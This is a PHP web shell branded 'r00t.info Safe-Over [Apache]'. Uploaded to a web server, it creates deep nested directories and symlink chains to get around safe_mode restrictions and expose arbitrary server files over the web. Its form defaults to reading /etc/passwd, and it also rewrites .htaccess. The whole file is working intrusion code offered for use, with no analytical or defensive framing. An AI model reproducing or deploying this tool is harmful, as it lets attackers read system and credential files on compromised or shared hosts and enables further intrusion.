<?php
session_start();
$Res = '';

if (is_writable("."))
	{
	if (isset($_POST['file']))
		{
		$file = $_POST['file'];
		$fakedir = "cx";
		$fakedep = 16;
		if (!(isset($_SESSION['num'])))
			{
			$_SESSION['num'] = 0;
			}
		  else
			{
			$_SESSION['num'] = $_SESSION['num'] + 1;
			}

		$level = 0;
		@unlink("sun-" . $_SESSION['num']);
		@mkdir("sun-" . $_SESSION['num']);
		chdir("sun-" . $_SESSION['num']);
		for ($as = 0; $as < $fakedep; $as++)
			{
			if (!file_exists($fakedir)) mkdir($fakedir);
			chdir($fakedir);
			}

		while (1 < $as--) chdir("..");
		$hardstyle = explode("/", $file);
		for ($a = 0; $a < count($hardstyle); $a++)
			{
			if (!empty($hardstyle[$a]))
				{
				if (!file_exists($hardstyle[$a])) mkdir($hardstyle[$a]);
				chdir($hardstyle[$a]);
				$as++;
				}
			}

		$as++;
		while ($as--) chdir("..");
		@rmdir("sun-fake");
		@unlink("sun-fake");
		@symlink(str_repeat($fakedir . "/", $fakedep) , "sun-fake");
		if ($_POST['type'] == 'file')
			{
			while (1)
			if (true == (@symlink("sun-fake/" . str_repeat("../", $fakedep - 1) . $file, "index.html"))) break;
			  else $num++;
			@unlink("sun-fake");
			mkdir("sun-fake");
			$Res = '<FONT COLOR="RED"><B> symlink <B><a href="./sun-' . $_SESSION['num'] . '/">symlink' . $num . '</a> file</FONT>';
			}
		  else
			{
			$fp = fopen(".htaccess", 'a+');
			$File = 'DirectoryIndex sun.htm';
			fwrite($fp, $File);
			while (1)
			if (true == (@symlink("sun-fake/" . str_repeat("../", $fakedep - 1) . $file, "sun"))) break;
			  else $num++;
			@unlink("sun-fake");
			mkdir("sun-fake");
			$Res = '<FONT COLOR="RED"><a href="./sun-' . $_SESSION['num'] . '/sun">Check It!' . $num . '</a></FONT>';
			}
		}
	}
  else
	{
	$Res = '<FONT COLOR="RED">Cant Write In Directory!</Font>';
	}

If (@ini_get("safe_mode") Or strtoupper(@ini_get("safe_mode")) == "on")
	{
	$Safe = '<span style="color:red"><b>On</b></span>';
	}

Else
	{
	$Safe = '<span style="color:lime"><b>Off</b></span>';
	} ?>
<Html>
<Head>
<Title>r00t.info  Safe-Over [Apache]</Title>
</Head>
<Body bgcolor="black">
<Center>
<font size="-3">
<pre><font color=yellow>       
                                                                                                                                                          
                                                                                                                                                          
                         000000000          000000000              tttt                    iiii                        ffffffffffffffff                   
                       00:::::::::00      00:::::::::00         ttt:::t                   i::::i                      f::::::::::::::::f                  
                     00:::::::::::::00  00:::::::::::::00       t:::::t                    iiii                      f::::::::::::::::::f                 
                    0:::::::000:::::::00:::::::000:::::::0      t:::::t                                              f::::::fffffff:::::f                 
rrrrr   rrrrrrrrr   0::::::0   0::::::00::::::0   0::::::0ttttttt:::::ttttttt            iiiiiii nnnn  nnnnnnnn      f:::::f       ffffff   ooooooooooo   
r::::rrr:::::::::r  0:::::0     0:::::00:::::0     0:::::0t:::::::::::::::::t            i:::::i n:::nn::::::::nn    f:::::f              oo:::::::::::oo 
r:::::::::::::::::r 0:::::0     0:::::00:::::0     0:::::0t:::::::::::::::::t             i::::i n::::::::::::::nn  f:::::::ffffff       o:::::::::::::::o
rr::::::rrrrr::::::r0:::::0 000 0:::::00:::::0 000 0:::::0tttttt:::::::tttttt             i::::i nn:::::::::::::::n f::::::::::::f       o:::::ooooo:::::o
 r:::::r     r:::::r0:::::0 000 0:::::00:::::0 000 0:::::0      t:::::t                   i::::i   n:::::nnnn:::::n f::::::::::::f       o::::o     o::::o
 r:::::r     rrrrrrr0:::::0     0:::::00:::::0     0:::::0      t:::::t                   i::::i   n::::n    n::::n f:::::::ffffff       o::::o     o::::o
 r:::::r            0:::::0     0:::::00:::::0     0:::::0      t:::::t                   i::::i   n::::n    n::::n  f:::::f             o::::o     o::::o
 r:::::r            0::::::0   0::::::00::::::0   0::::::0      t:::::t    tttttt         i::::i   n::::n    n::::n  f:::::f             o::::o     o::::o
 r:::::r            0:::::::000:::::::00:::::::000:::::::0      t::::::tttt:::::t        i::::::i  n::::n    n::::n f:::::::f            o:::::ooooo:::::o
 r:::::r             00:::::::::::::00  00:::::::::::::00       tt::::::::::::::t ...... i::::::i  n::::n    n::::n f:::::::f            o:::::::::::::::o
 r:::::r               00:::::::::00      00:::::::::00           tt:::::::::::tt .::::. i::::::i  n::::n    n::::n f:::::::f             oo:::::::::::oo 
 rrrrrrr                 000000000          000000000               ttttttttttt   ...... iiiiiiii  nnnnnn    nnnnnn fffffffff               ooooooooooo   
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          

</font>
</font>
<br /><br /><br />
<?php
echo '<div style="background-color:#101010;color:yellow"><b>Safe-Mode : </font>' . $Safe; ?>
<Form action="<?php
echo $_SERVER["PHP_SELF"]; ?>" method="post">
<font color="yellow" size="3"><b>Path:<b></font><Input type="text" name="file" style="background-color:black;color:#FF3300;width:200px;" value="/etc/passwd"><br /><font color="yellow" size=3><br /><b>File</b></font><input checked type="radio" name="type" value="file"><font color="yellow" size=3>     <b>Dir</font><input type="radio" name="type" value="Dir"><br /><br /><br /><Input type="submit" value="Go!" style="width:100px;background-color:black;color:yellow">
</font>
</Form>
<?php
print $Res; 
?>
<table align="center" style="color:lime"> r00t</table>
</Center>
</Body>
</Html>
<P style="TEXT-ALIGN: center" align=center>
